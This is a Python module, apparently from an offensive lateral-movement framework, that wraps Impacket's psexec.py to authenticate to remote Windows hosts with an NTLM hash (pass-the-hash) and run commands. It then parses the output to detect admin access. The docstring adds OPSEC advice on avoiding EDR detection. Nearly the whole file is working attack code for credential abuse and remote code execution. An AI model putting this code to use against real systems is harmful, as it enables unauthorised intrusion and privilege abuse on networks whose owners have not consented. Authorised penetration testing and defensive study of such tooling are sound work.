"""
PSExec Pass-the-Hash using Impacket's psexec
Classic lateral movement - noisy but reliable
"""

import sys
from pathlib import Path
from typing import Optional, Tuple

# Add parent to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent))

from .base import BaseAuthMethod
from ..core.models import AuthMethod, AccessLevel, Credential


class PSExecAuthMethod(BaseAuthMethod):
    """
    Pass-the-Hash via PSExec using Impacket's psexec

    PSExec is the classic lateral movement technique. It works
    by uploading a service binary and executing it.

    Advantages:
        - Very reliable
        - Works on most Windows systems
        - Full shell access

    Disadvantages:
        - Creates service on remote system (noisy)
        - Leaves artifacts (service logs)
        - Heavily monitored in mature environments
        - May trigger EDR alerts

    OPSEC Note: Use sparingly. Prefer WMI or SMB for stealth.
    """

    method = AuthMethod.PSEXEC_IMPACKET

    def __init__(self, timeout: int = 30):
        super().__init__(timeout)
        self.default_command = "whoami"

    def build_command(self, target: str, credential: Credential,
                      command: Optional[str] = None) -> str:
        """
        Build Impacket psexec command

        Format: psexec.py domain/username@target -hashes :ntlm_hash command

        Args:
            target: Target IP or hostname
            credential: Credential with username, hash, domain
            command: Command to execute (defaults to 'whoami')

        Returns:
            psexec command string
        """
        exec_command = command or self.default_command

        cmd = (
            f"psexec.py "
            f"{credential.domain}/{credential.username}@{target} "
            f"-hashes :{credential.ntlm_hash} "
            f"'{exec_command}'"
        )

        return cmd

    def parse_output(self, output_text: str) -> Tuple[bool, AccessLevel, Optional[str]]:
        """
        Parse psexec output

        Args:
            output_text: psexec command output

        Returns:
            Tuple of (success, access_level, error_message)
        """
        output_lower = output_text.lower()

        # PSExec requires admin to install service
        error_indicators = [
            'error',
            'access denied',
            'access is denied',
            'rpc_s_access_denied',
            'connection refused',
            'timed out',
            'status_logon_failure'
        ]

        for indicator in error_indicators:
            if indicator in output_lower:
                return False, AccessLevel.NONE, f"PSExec failed: {indicator}"

        # PSExec success = admin access (needed for service installation)
        if output_text.strip():
            return True, AccessLevel.ADMIN, None

        return False, AccessLevel.NONE, "PSExec returned no output"